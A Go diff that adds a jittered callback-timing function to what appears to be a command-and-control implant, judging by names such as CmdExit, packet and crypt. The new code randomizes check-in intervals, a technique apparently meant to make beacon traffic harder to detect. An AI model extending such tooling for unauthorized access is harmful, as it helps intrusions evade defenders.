@@ -2,6 +2,7 @@ package services
 
 import (
 	"bytes"
+	"crypto/rand"
 	"errors"
 	"fmt"
 	"io"
@@ -9,6 +10,7 @@ import (
 	"main/crypt"
 	"main/packet"
 	"main/util"
+	"math/big"
 	"os"
 	"runtime"
 	"strconv"
@@ -348,4 +350,18 @@ func CmdExit() ([]byte, error) {
 	}
 	os.Exit(0)
 	return []byte("success exit"), nil
+}
+
+func CallbackTime() (time.Duration, error) {
+	waitTime := config.WaitTime.Milliseconds()
+	jitter := int64(config.Jitter)
+	if jitter <= 0 || jitter > 100 {
+		return config.WaitTime, nil
+	}
+	result, err := rand.Int(rand.Reader, big.NewInt(2*waitTime/100*jitter))
+	if err != nil {
+		return config.WaitTime, err
+	}
+	waitTime = result.Int64() + waitTime - waitTime/100*jitter
+	return time.Duration(waitTime) * time.Millisecond, nil
 }
